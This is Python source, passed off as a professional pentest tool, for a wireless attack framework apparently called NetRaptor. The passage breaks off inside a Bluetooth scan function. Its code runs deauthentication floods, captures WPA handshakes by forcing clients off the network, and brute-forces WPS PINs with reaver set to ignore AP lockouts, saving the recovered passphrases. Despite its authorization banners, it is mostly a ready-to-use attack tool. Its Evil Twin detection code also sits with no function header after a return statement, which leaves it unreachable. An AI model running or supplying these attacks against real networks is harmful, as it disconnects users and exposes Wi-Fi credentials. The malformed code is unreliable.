#!/usr/bin/env python3
"""
Advanced Wireless Security Penetration Testing Tool
Professional wireless network security auditing framework
For authorized penetration testing and security research only!

Author: Security Research Team
Version: 2.0
"""

import subprocess
import re
import time
import json
import csv
import threading
import signal
import sys
import os
import argparse
from datetime import datetime
from collections import defaultdict
import tempfile
import hashlib

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WirelessPenTest:
    def __init__(self):
        self.interface = None
        self.original_mode = None
        self.networks = {}
        self.handshakes = []
        self.wps_networks = []
        self.bluetooth_devices = []
        self.vulnerabilities = []
        self.scan_process = None
        self.temp_files = []
        self.target_network = None
        
    def print_banner(self):
        banner = f"""
{Colors.HEADER}
╔══════════════════════════════════════════════════════════════════════════════╗
║                              ███╗   ██╗███████╗████████╗                    ║
║                              ████╗  ██║██╔════╝╚══██╔══╝                    ║
║                              ██╔██╗ ██║█████╗     ██║                       ║
║                              ██║╚██╗██║██╔══╝     ██║                       ║
║                              ██║ ╚████║███████╗   ██║                       ║
║                              ╚═╝  ╚═══╝╚══════╝   ╚═╝                       ║
║           ██████╗  █████╗ ██████╗ ████████╗ ██████╗ ██████╗                 ║
║           ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗                ║
║           ██████╔╝███████║██████╔╝   ██║   ██║   ██║██████╔╝                ║
║           ██╔══██╗██╔══██║██╔═══╝    ██║   ██║   ██║██╔══██╗                ║
║           ██║  ██║██║  ██║██║        ██║   ╚██████╔╝██║  ██║                ║
║           ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║              Advanced Wireless Penetration Testing Framework                ║
║                                Version 2.0                                  ║
║                         Author: Lokidres | MIT License                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  🛡️  WPA/WPA2 Audit | WPS Testing | Deauth Attacks | Handshake Capture   ║
║  🔍  Evil Twin Detection | Bluetooth Scan | Packet Injection Testing      ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}[WARNING] For authorized penetration testing only!{Colors.END}
{Colors.YELLOW}[WARNING] Use only on networks you own or have explicit permission to test!{Colors.END}
{Colors.CYAN}[INFO] GitHub: https://github.com/Lokidres/NetRaptor{Colors.END}
        """
        print(banner)

    def print_usage(self):
        """Print usage information with all available flags"""
        usage = f"""
{Colors.CYAN}USAGE:{Colors.END}
    sudo python3 netraptor.py [OPTIONS] <FLAGS>

{Colors.CYAN}INTERFACE OPTIONS:{Colors.END}
    -i, --interface <iface>     Specify wireless interface (auto-detect if not provided)
    -t, --timeout <seconds>     Scan timeout duration (default: 30)

{Colors.CYAN}CORE FEATURES:{Colors.END}
    --scan                      Basic wireless network discovery
    --wpa-audit                 WPA/WPA2 security audit and analysis
    --wps-test                  WPS vulnerability testing and detection
    --wps-attack <BSSID>        WPS PIN brute force attack on target network
    --deauth <BSSID>            Deauthentication attack on target network
    --handshake <BSSID>         Capture WPA/WPA2 handshake from target
    --crack-handshake <file>    Crack captured handshake using wordlist
    --evil-twin                 Detect Evil Twin (rogue) access points
    --bluetooth                 Bluetooth device discovery and analysis
    --injection-test            Test wireless packet injection capability

{Colors.CYAN}ADVANCED OPTIONS:{Colors.END}
    --channel <num>             Specify target channel for attacks
    --wordlist <file>           Custom wordlist for handshake cracking
    --output <format>           Report format: json, html, both (default: both)
    --monitor-only              Only enable monitor mode and exit
    --verbose                   Enable verbose debugging output

{Colors.CYAN}EXAMPLES:{Colors.END}
    # Basic network scan
    sudo python3 netraptor.py --scan

    # Comprehensive security audit
    sudo python3 netraptor.py --scan --wpa-audit --wps-test --evil-twin

    # WPS PIN brute force attack
    sudo python3 netraptor.py --wps-attack AA:BB:CC:DD:EE:FF --channel 6

    # Capture and crack handshake
    sudo python3 netraptor.py --handshake AA:BB:CC:DD:EE:FF --channel 6
    sudo python3 netraptor.py --crack-handshake handshake_file.cap --wordlist rockyou.txt

    # Deauth attack with monitoring
    sudo python3 netraptor.py --deauth AA:BB:CC:DD:EE:FF --channel 11 --verbose

    # Bluetooth and wireless scan
    sudo python3 netraptor.py --scan --bluetooth

    # Test packet injection capability
    sudo python3 netraptor.py --injection-test -i wlan0

{Colors.YELLOW}[NOTICE] You must specify at least one feature flag to run the tool!{Colors.END}
{Colors.CYAN}[INFO] More info: https://github.com/Lokidres/NetRaptor{Colors.END}
        """
        print(usage)

    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Colors.YELLOW}[*] Cleaning up and exiting...{Colors.END}")
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        """Clean up processes and temporary files"""
        if self.scan_process:
            try:
                self.scan_process.terminate()
                self.scan_process.wait(timeout=5)
            except:
                pass
        
        # Restore original interface mode
        if self.interface and self.original_mode:
            try:
                subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', self.original_mode], 
                             capture_output=True)
                subprocess.run(['sudo', 'service', 'network-manager', 'start'], 
                             capture_output=True)
            except:
                pass
        
        # Clean temp files
        for temp_file in self.temp_files:
            try:
                os.remove(temp_file)
            except:
                pass

    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] This tool requires root privileges. Run with sudo.{Colors.END}")
            return False
        return True

    def check_dependencies(self):
        """Check for required tools"""
        required_tools = {
            'aircrack-ng': ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng'],
            'reaver': ['reaver', 'wash'],
            'hostapd': ['hostapd'],
            'dnsmasq': ['dnsmasq'],
            'bluetoothctl': ['bluetoothctl'],
            'hcxtools': ['hcxdumptool', 'hcxpcapngtool']
        }
        
        missing_packages = []
        available_tools = {}
        
        for package, tools in required_tools.items():
            package_available = True
            for tool in tools:
                try:
                    result = subprocess.run(['which', tool], capture_output=True)
                    if result.returncode != 0:
                        package_available = False
                        break
                except:
                    package_available = False
                    break
            
            available_tools[package] = package_available
            if not package_available:
                missing_packages.append(package)
        
        if missing_packages:
            print(f"{Colors.YELLOW}[!] Optional packages not installed: {', '.join(missing_packages)}{Colors.END}")
            print(f"{Colors.CYAN}[*] Install with: sudo apt-get install {' '.join(missing_packages)}{Colors.END}")
        
        return available_tools

    def get_interfaces(self):
        """Get available wireless interfaces"""
        interfaces = []
        
        try:
            # Method 1: iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or '802.11' in line:
                    interface = line.split()[0]
                    interfaces.append(interface)
            
            # Method 2: iw dev (if iwconfig failed)
            if not interfaces:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        interface = line.split()[1]
                        interfaces.append(interface)
            
            # Method 3: /sys/class/net
            if not interfaces:
                import glob
                for path in glob.glob('/sys/class/net/*/wireless'):
                    interface = path.split('/')[-2]
                    interfaces.append(interface)
            
            # Remove duplicates and filter
            interfaces = list(set([iface for iface in interfaces if iface and len(iface) > 2]))
            return interfaces
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error getting interfaces: {e}{Colors.END}")
            return []

    def get_interface_mode(self, interface):
        """Get current interface mode"""
        try:
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
            
            if 'Mode:Monitor' in result.stdout:
                return 'monitor'
            elif 'Mode:Managed' in result.stdout:
                return 'managed'
            elif 'monitor' in result.stdout.lower():
                return 'monitor'
            elif 'managed' in result.stdout.lower():
                return 'managed'
            else:
                return 'unknown'
        except:
            return 'unknown'

    def enable_monitor_mode(self, interface):
        """Enable monitor mode on interface with multiple methods"""
        print(f"{Colors.CYAN}[*] Enabling monitor mode on {interface}...{Colors.END}")
        
        # Store original mode
        self.original_mode = self.get_interface_mode(interface)
        
        # Method 1: Using airmon-ng (preferred)
        monitor_interface = self._try_airmon_method(interface)
        if monitor_interface:
            return monitor_interface
        
        # Method 2: Manual iwconfig method
        monitor_interface = self._try_manual_method(interface)
        if monitor_interface:
            return monitor_interface
        
        # Method 3: Direct iwconfig on same interface
        monitor_interface = self._try_direct_method(interface)
        if monitor_interface:
            return monitor_interface
        
        print(f"{Colors.RED}[!] All monitor mode methods failed{Colors.END}")
        print(f"{Colors.YELLOW}[*] Continuing in managed mode (limited functionality){Colors.END}")
        return interface

    def _try_airmon_method(self, interface):
        """Try airmon-ng method"""
        try:
            print(f"{Colors.CYAN}[*] Trying airmon-ng method...{Colors.END}")
            
            # Stop network manager services
            services = ['NetworkManager', 'network-manager', 'wpa_supplicant']
            for service in services:
                subprocess.run(['sudo', 'systemctl', 'stop', service], capture_output=True)
                subprocess.run(['sudo', 'service', service, 'stop'], capture_output=True)
            
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Take interface down
            subprocess.run(['sudo', 'ifconfig', interface, 'down'], capture_output=True)
            
            # Start monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                  capture_output=True, text=True)
            
            # Look for monitor interface
            monitor_interface = None
            
            # Check common monitor interface names
            possible_names = [
                interface + 'mon',
                interface + '_mon', 
                'mon' + interface[-1:],
                interface[:-1] + 'mon',
                interface
            ]
            
            for name in possible_names:
                if self.get_interface_mode(name) == 'monitor':
                    monitor_interface = name
                    break
            
            if monitor_interface:
                print(f"{Colors.GREEN}[+] Monitor mode enabled on {monitor_interface}{Colors.END}")
                return monitor_interface
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Airmon-ng method failed: {e}{Colors.END}")
            return None

    def _try_manual_method(self, interface):
        """Try manual iwconfig method"""
        try:
            print(f"{Colors.CYAN}[*] Trying manual iwconfig method...{Colors.END}")
            
            # Kill processes that might interfere
            processes = ['wpa_supplicant', 'dhclient', 'NetworkManager']
            for proc in processes:
                subprocess.run(['sudo', 'killall', proc], capture_output=True)
            
            # Take interface down
            subprocess.run(['sudo', 'ifconfig', interface, 'down'], capture_output=True)
            
            # Set monitor mode
            subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], capture_output=True)
            
            # Bring interface up
            subprocess.run(['sudo', 'ifconfig', interface, 'up'], capture_output=True)
            
            # Verify
            if self.get_interface_mode(interface) == 'monitor':
                print(f"{Colors.GREEN}[+] Manual monitor mode enabled on {interface}{Colors.END}")
                return interface
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Manual method failed: {e}{Colors.END}")
            return None

    def _try_direct_method(self, interface):
        """Try direct method without stopping services"""
        try:
            print(f"{Colors.CYAN}[*] Trying direct method...{Colors.END}")
            
            # Set monitor mode directly
            subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], capture_output=True)
            
            # Check if it worked
            if self.get_interface_mode(interface) == 'monitor':
                print(f"{Colors.GREEN}[+] Direct monitor mode enabled on {interface}{Colors.END}")
                return interface
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Direct method failed: {e}{Colors.END}")
            return None

    def scan_networks(self, interface, duration=30):
        """Scan for wireless networks using multiple methods"""
        current_mode = self.get_interface_mode(interface)
        
        if current_mode == 'monitor':
            print(f"{Colors.CYAN}[*] Scanning in monitor mode using airodump-ng ({duration}s)...{Colors.END}")
            return self._scan_with_airodump(interface, duration)
        else:
            print(f"{Colors.CYAN}[*] Scanning in managed mode using iwlist ({duration}s)...{Colors.END}")
            return self._scan_with_iwlist(interface, duration)

    def _scan_with_airodump(self, interface, duration):
        """Scan using airodump-ng (monitor mode)"""
        try:
            # Create temporary files
            temp_prefix = tempfile.mktemp()
            csv_file = temp_prefix + '-01.csv'
            self.temp_files.extend([csv_file, temp_prefix + '-01.cap'])
            
            # Start airodump-ng
            cmd = ['sudo', 'airodump-ng', '-w', temp_prefix, '--output-format', 'csv', interface]
            self.scan_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                               stderr=subprocess.DEVNULL)
            
            # Show progress
            for i in range(duration):
                print(f"\r{Colors.CYAN}[*] Scanning... {i+1}/{duration}s{Colors.END}", end='', flush=True)
                time.sleep(1)
            print()
            
            # Stop scanning
            if self.scan_process:
                self.scan_process.terminate()
                self.scan_process.wait()
                self.scan_process = None
            
            # Parse results
            networks = self.parse_airodump_csv(csv_file)
            return networks
            
        except Exception as e:
            print(f"{Colors.RED}[!] Airodump scanning error: {e}{Colors.END}")
            return {}

    def _scan_with_iwlist(self, interface, duration):
        """Scan using iwlist (managed mode)"""
        networks = {}
        
        try:
            print(f"{Colors.YELLOW}[*] Using iwlist scanning (managed mode - limited features){Colors.END}")
            
            # Multiple scans for better results
            scan_count = max(1, duration // 10)
            
            for scan_num in range(scan_count):
                print(f"\r{Colors.CYAN}[*] Scan {scan_num + 1}/{scan_count}...{Colors.END}", end='', flush=True)
                
                result = subprocess.run(['sudo', 'iwlist', interface, 'scan'], 
                                      capture_output=True, text=True, timeout=15)
                
                scan_networks = self._parse_iwlist_output(result.stdout)
                
                # Merge results
                for bssid, network in scan_networks.items():
                    if bssid not in networks:
                        networks[bssid] = network
                    else:
                        # Update with stronger signal if found
                        try:
                            current_power = int(networks[bssid]['power'])
                            new_power = int(network['power'])
                            if new_power > current_power:
                                networks[bssid] = network
                        except:
                            pass
                
                time.sleep(2)  # Wait between scans
            
            print()
            return networks
            
        except Exception as e:
            print(f"{Colors.RED}[!] iwlist scanning error: {e}{Colors.END}")
            return {}

    def _parse_iwlist_output(self, output):
        """Parse iwlist scan output"""
        networks = {}
        current_network = {}
        
        for line in output.split('\n'):
            line = line.strip()
            
            if 'Cell' in line and 'Address:' in line:
                if current_network.get('bssid'):
                    networks[current_network['bssid']] = current_network
                current_network = {'bssid': line.split('Address: ')[1]}
            
            elif 'ESSID:' in line:
                essid = line.split('ESSID:')[1].strip('"')
                current_network['essid'] = essid if essid else '<Hidden>'
            
            elif 'Frequency:' in line:
                freq_match = re.search(r'Frequency:([\d.]+)', line)
                channel_match = re.search(r'Channel (\d+)', line)
                
                if freq_match:
                    current_network['speed'] = freq_match.group(1) + ' GHz'
                
                if channel_match:
                    current_network['channel'] = channel_match.group(1)
                elif freq_match:
                    # Calculate channel from frequency
                    freq_val = float(freq_match.group(1))
                    if freq_val < 2.5:
                        channel = int((freq_val - 2.407) / 0.005) + 1
                    else:
                        channel = int((freq_val - 5.000) / 0.005)
                    current_network['channel'] = str(channel)
            
            elif 'Quality=' in line:
                signal_match = re.search(r'Signal level=(-?\d+)', line)
                if signal_match:
                    current_network['power'] = signal_match.group(1)
                else:
                    current_network['power'] = '-70'  # Default
            
            elif 'Encryption key:' in line:
                if 'off' in line:
                    current_network['privacy'] = 'OPN'
                    current_network['cipher'] = 'None'
                    current_network['authentication'] = 'Open'
                else:
                    current_network['privacy'] = 'WPA'
                    current_network['cipher'] = 'Unknown'
                    current_network['authentication'] = 'PSK'
            
            elif 'IE: WPA' in line:
                current_network['privacy'] = 'WPA'
                current_network['authentication'] = 'PSK'
            elif 'IE: IEEE 802.11i/WPA2' in line:
                current_network['privacy'] = 'WPA2'
                current_network['authentication'] = 'PSK'
            elif 'WEP' in line:
                current_network['privacy'] = 'WEP'
                current_network['cipher'] = 'WEP'
                current_network['authentication'] = 'Open'
        
        # Add last network
        if current_network.get('bssid'):
            # Fill missing fields
            if 'essid' not in current_network:
                current_network['essid'] = '<Unknown>'
            if 'channel' not in current_network:
                current_network['channel'] = '0'
            if 'power' not in current_network:
                current_network['power'] = '-70'
            if 'privacy' not in current_network:
                current_network['privacy'] = 'Unknown'
            if 'cipher' not in current_network:
                current_network['cipher'] = 'Unknown'
            if 'authentication' not in current_network:
                current_network['authentication'] = 'Unknown'
            if 'speed' not in current_network:
                current_network['speed'] = 'Unknown'
            
            # Add missing fields for compatibility
            current_network['beacons'] = '0'
            current_network['data_packets'] = '0'
            current_network['first_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            current_network['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            networks[current_network['bssid']] = current_network
        
        return networks

    def parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = {}
        
        try:
            if not os.path.exists(csv_file):
                return networks
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Split into network and client sections
            sections = content.split('\r\n\r\n')
            if not sections:
                return networks
            
            network_section = sections[0]
            lines = network_section.split('\n')
            
            # Find header line
            header_line = None
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'ESSID' in line:
                    header_line = i
                    break
            
            if header_line is None:
                return networks
            
            # Parse network data
            for line in lines[header_line + 1:]:
                if not line.strip():
                    continue
                
                try:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) < 14:
                        continue
                    
                    bssid = parts[0]
                    if not bssid or bssid == 'BSSID':
                        continue
                    
                    essid = parts[13] if parts[13] else '<Hidden>'
                    
                    network = {
                        'bssid': bssid,
                        'essid': essid,
                        'channel': parts[3],
                        'speed': parts[4],
                        'privacy': parts[5],
                        'cipher': parts[6],
                        'authentication': parts[7],
                        'power': parts[8],
                        'beacons': parts[9],
                        'data_packets': parts[10],
                        'first_seen': parts[1],
                        'last_seen': parts[2]
                    }
                    
                    networks[bssid] = network
                    
                except Exception:
                    continue
            
            return networks
            
        except Exception as e:
            print(f"{Colors.RED}[!] CSV parsing error: {e}{Colors.END}")
            return networks

    def test_packet_injection(self, interface):
        """Test packet injection capability"""
        try:
            print(f"{Colors.CYAN}[*] Testing packet injection capability on {interface}...{Colors.END}")
            
            result = subprocess.run(['sudo', 'aireplay-ng', '--test', interface], 
                                  capture_output=True, text=True, timeout=15)
            
            if 'Injection is working!' in result.stdout:
                print(f"{Colors.GREEN}[+] Packet injection is working!{Colors.END}")
                return True
            else:
                print(f"{Colors.YELLOW}[!] Packet injection test failed or not working properly{Colors.END}")
                print(f"{Colors.YELLOW}[*] Output: {result.stdout[:100]}...{Colors.END}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Injection test error: {e}{Colors.END}")
            return False

    def scan_wps(self, interface, timeout=30):
        """Scan for WPS-enabled networks"""
        try:
            print(f"{Colors.CYAN}[*] Scanning for WPS-enabled networks ({timeout}s)...{Colors.END}")
            
            result = subprocess.run(['sudo', 'wash', '-i', interface, '-C'], 
                                  capture_output=True, text=True, timeout=timeout)
            
            wps_networks = []
            lines = result.stdout.split('\n')
            
            for line in lines[1:]:  # Skip header
                if line.strip() and len(line.split()) >= 6:
                    parts = line.split()
                    wps_network = {
                        'bssid': parts[0],
                        'channel': parts[1],
                        'rssi': parts[2],
                        'wps_version': parts[3],
                        'wps_locked': parts[4],
                        'essid': ' '.join(parts[5:]) if len(parts) > 5 else 'Unknown'
                    }
                    wps_networks.append(wps_network)
            
            self.wps_networks = wps_networks
            print(f"{Colors.GREEN}[+] Found {len(wps_networks)} WPS-enabled networks{Colors.END}")
            return wps_networks
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] WPS scan failed: {e}{Colors.END}")
            return []

    def wpa_audit(self):
        """Perform WPA/WPA2 security audit"""
        if not self.networks:
            print(f"{Colors.YELLOW}[!] No networks to audit. Run --scan first.{Colors.END}")
            return
        
        print(f"{Colors.HEADER}=== WPA/WPA2 SECURITY AUDIT ==={Colors.END}")
        
        wpa_networks = []
        for bssid, network in self.networks.items():
            if 'WPA' in network.get('privacy', ''):
                wpa_networks.append((bssid, network))
        
        if not wpa_networks:
            print(f"{Colors.YELLOW}[!] No WPA/WPA2 networks found to audit{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[+] Found {len(wpa_networks)} WPA/WPA2 networks{Colors.END}")
        
        for bssid, network in wpa_networks:
            print(f"\n{Colors.CYAN}Network: {network['essid']} ({bssid}){Colors.END}")
            print(f"  Channel: {network['channel']}")
            print(f"  Security: {network['privacy']}")
            print(f"  Cipher: {network['cipher']}")
            print(f"  Authentication: {network['authentication']}")
            
            # Check for common vulnerabilities
            issues = []
            
            # Check for WPS if available
            wps_enabled = any(wps['bssid'] == bssid for wps in self.wps_networks)
            if wps_enabled:
                issues.append("WPS enabled - vulnerable to PIN brute force")
            
            # Check signal strength
            try:
                power = int(network['power'])
                if power > -30:
                    issues.append(f"Very strong signal ({power} dBm) - large attack surface")
            except:
                pass
            
            # Check for default naming
            default_names = ['linksys', 'netgear', 'dlink', 'default', 'wireless']
            if any(name in network['essid'].lower() for name in default_names):
                issues.append("Using default/common SSID")
            
            if issues:
                for issue in issues:
                    print(f"    {Colors.YELLOW}[ISSUE] {issue}{Colors.END}")
            else:
                print(f"    {Colors.GREEN}[OK] No obvious issues detected{Colors.END}")

    def deauth_attack(self, target_bssid, channel, count=10):
        """Perform deauthentication attack"""
        try:
            print(f"{Colors.CYAN}[*] Starting deauthentication attack on {target_bssid}...{Colors.END}")
            print(f"{Colors.YELLOW}[WARNING] This will disconnect clients from the target network!{Colors.END}")
            
            # Set channel
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)], 
                         capture_output=True)
            
            # Perform deauth attack
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target_bssid, self.interface]
            
            print(f"{Colors.CYAN}[*] Sending {count} deauthentication packets...{Colors.END}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] Deauthentication attack completed{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Deauthentication attack failed{Colors.END}")
                print(f"{Colors.YELLOW}[*] Error: {result.stderr}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Deauth attack error: {e}{Colors.END}")

    def capture_handshake(self, target_bssid, channel, timeout=60):
        """Capture WPA/WPA2 handshake"""
        try:
            print(f"{Colors.CYAN}[*] Capturing handshake for {target_bssid} on channel {channel}...{Colors.END}")
            
            # Set channel
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)], 
                         capture_output=True)
            
            # Create capture file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = f"handshake_{target_bssid.replace(':', '')}_{timestamp}"
            
            # Start capture
            capture_cmd = ['sudo', 'airodump-ng', '-c', str(channel), 
                          '--bssid', target_bssid, '-w', capture_file, self.interface]
            
            print(f"{Colors.CYAN}[*] Starting handshake capture...{Colors.END}")
            capture_process = subprocess.Popen(capture_cmd, stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL)
            
            # Wait a bit then send deauth
            time.sleep(5)
            
            print(f"{Colors.CYAN}[*] Sending deauthentication to force handshake...{Colors.END}")
            deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '5', '-a', target_bssid, self.interface]
            subprocess.run(deauth_cmd, capture_output=True, timeout=10)
            
            # Continue capture
            print(f"{Colors.CYAN}[*] Continuing capture for {timeout-15} seconds...{Colors.END}")
            time.sleep(timeout - 15)
            
            # Stop capture
            capture_process.terminate()
            capture_process.wait()
            
            # Check for handshake
            cap_file = capture_file + '-01.cap'
            if os.path.exists(cap_file):
                result = subprocess.run(['sudo', 'aircrack-ng', cap_file], 
                                      capture_output=True, text=True)
                
                if 'handshake' in result.stdout.lower():
                    print(f"{Colors.GREEN}[+] Handshake captured successfully!{Colors.END}")
                    print(f"{Colors.GREEN}[+] Saved to: {cap_file}{Colors.END}")
                    self.handshakes.append({
                        'bssid': target_bssid,
                        'file': cap_file,
                        'timestamp': datetime.now().isoformat()
                    })
                    return cap_file
                else:
                    print(f"{Colors.YELLOW}[!] No handshake captured in {cap_file}{Colors.END}")
                    print(f"{Colors.YELLOW}[*] Try increasing timeout or ensuring clients are connected{Colors.END}")
                    return None
            else:
                print(f"{Colors.RED}[!] Capture file not created{Colors.END}")
                return None
                
        except Exception as e:
            print(f"{Colors.RED}[!] Handshake capture error: {e}{Colors.END}")
            return None

    def wps_pin_attack(self, target_bssid, channel, timeout=3600):
        """Perform WPS PIN brute force attack using reaver"""
        try:
            print(f"{Colors.CYAN}[*] Starting WPS PIN brute force attack on {target_bssid}...{Colors.END}")
            print(f"{Colors.YELLOW}[WARNING] This attack may take several hours to complete!{Colors.END}")
            print(f"{Colors.YELLOW}[INFO] Press Ctrl+C to stop the attack at any time{Colors.END}")
            
            # Set channel
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)], 
                         capture_output=True)
            
            # Check if target has WPS enabled
            wps_enabled = any(wps['bssid'].upper() == target_bssid.upper() for wps in self.wps_networks)
            if not wps_enabled:
                print(f"{Colors.YELLOW}[WARNING] Target may not have WPS enabled or is locked{Colors.END}")
                proceed = input(f"{Colors.CYAN}[?] Continue anyway? (y/n): {Colors.END}")
                if proceed.lower() != 'y':
                    return None
            
            # Prepare reaver command
            reaver_cmd = [
                'sudo', 'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-vv',          # Verbose mode
                '-L',           # Ignore locked state
                '-N',           # Don't send NACK packets
                '-d', '15',     # Delay between PIN attempts
                '-T', '.5',     # Timeout for receive
                '-r', '3:15'    # Sleep after failure
            ]
            
            print(f"{Colors.CYAN}[*] Executing: {' '.join(reaver_cmd[2:])}{Colors.END}")
            print(f"{Colors.CYAN}[*] Attack started at: {datetime.now().strftime('%H:%M:%S')}{Colors.END}")
            
            # Start reaver process
            process = subprocess.Popen(reaver_cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, 
                                     universal_newlines=True, bufsize=1)
            
            pin_found = None
            passphrase_found = None
            start_time = time.time()
            
            try:
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    
                    if output:
                        output = output.strip()
                        
                        # Show progress
                        if 'Trying pin' in output:
                            current_pin = output.split('Trying pin ')[1].split()[0]
                            elapsed = int(time.time() - start_time)
                            print(f"\r{Colors.CYAN}[*] Trying PIN: {current_pin} | Elapsed: {elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}{Colors.END}", end='', flush=True)
                        
                        # Check for success
                        elif 'WPS PIN:' in output:
                            pin_match = re.search(r'WPS PIN: (\d+)', output)
                            if pin_match:
                                pin_found = pin_match.group(1)
                                print(f"\n{Colors.GREEN}[+] WPS PIN FOUND: {pin_found}{Colors.END}")
                        
                        elif 'WPA PSK:' in output:
                            psk_match = re.search(r'WPA PSK: (.+)', output)
                            if psk_match:
                                passphrase_found = psk_match.group(1).strip()
                                print(f"{Colors.GREEN}[+] WPA PASSPHRASE: {passphrase_found}{Colors.END}")
                        
                        # Check for errors
                        elif 'WPS pin not found' in output.lower():
                            print(f"\n{Colors.RED}[!] WPS PIN not found{Colors.END}")
                            break
                        elif 'ap rate limiting' in output.lower():
                            print(f"\n{Colors.YELLOW}[!] AP is rate limiting - slowing down attack{Colors.END}")
                        elif 'receive timeout' in output.lower():
                            print(f"\r{Colors.YELLOW}[!] Receive timeout - retrying...{Colors.END}", end='', flush=True)
                    
                    # Check timeout
                    if time.time() - start_time > timeout:
                        print(f"\n{Colors.YELLOW}[!] Attack timed out after {timeout} seconds{Colors.END}")
                        break
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
                process.terminate()
                process.wait()
            
            # Results
            if pin_found:
                result = {
                    'bssid': target_bssid,
                    'pin': pin_found,
                    'passphrase': passphrase_found,
                    'timestamp': datetime.now().isoformat(),
                    'duration': int(time.time() - start_time)
                }
                
                # Save results
                results_file = f"wps_attack_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(results_file, 'w') as f:
                    json.dump(result, f, indent=2)
                
                print(f"{Colors.GREEN}[+] Results saved to: {results_file}{Colors.END}")
                return result
            else:
                print(f"{Colors.RED}[!] Attack completed without finding PIN{Colors.END}")
                return None
                
        except Exception as e:
            print(f"{Colors.RED}[!] WPS attack error: {e}{Colors.END}")
            return None
        """Detect potential Evil Twin attacks"""
        if not self.networks:
            print(f"{Colors.YELLOW}[!] No networks to analyze. Run --scan first.{Colors.END}")
            return
        
        print(f"{Colors.HEADER}=== EVIL TWIN DETECTION ==={Colors.END}")
        
        # Group networks by ESSID
        essid_groups = defaultdict(list)
        for bssid, network in self.networks.items():
            essid = network['essid']
            if essid and essid != '<Hidden>':
                essid_groups[essid].append((bssid, network))
        
        # Look for suspicious patterns
        evil_twins_found = False
        
        for essid, networks in essid_groups.items():
            if len(networks) > 1:
                print(f"\n{Colors.YELLOW}[SUSPICIOUS] Multiple networks with ESSID: {essid}{Colors.END}")
                
                # Check for different security settings
                security_types = set()
                channels = set()
                
                for bssid, network in networks:
                    security_types.add(network['privacy'])
                    channels.add(network['channel'])
                    
                    print(f"  BSSID: {bssid}")
                    print(f"    Channel: {network['channel']}")
                    print(f"    Security: {network['privacy']}")
                    print(f"    Power: {network['power']} dBm")
                
                # Analysis
                if len(security_types) > 1:
                    print(f"  {Colors.RED}[ALERT] Different security types detected - potential Evil Twin!{Colors.END}")
                    evil_twins_found = True
                
                if len(channels) == len(networks):
                    print(f"  {Colors.YELLOW}[INFO] All on different channels{Colors.END}")
                else:
                    print(f"  {Colors.YELLOW}[WARNING] Some networks on same channel{Colors.END}")
        
        if not evil_twins_found:
            print(f"{Colors.GREEN}[+] No obvious Evil Twin attacks detected{Colors.END}")

    def bluetooth_scan(self, timeout=30):
        """Scan for Bluetooth devices"""
        try:
            print(f"{Colors.CYAN}[*] Scanning for Bluetooth devices ({timeout}s)...{Colors.END}")
            
            # Enable Bluetooth
            subprocess.run(['sudo', 'systemctl', 'start', 'bluetooth'], capture_output=True)
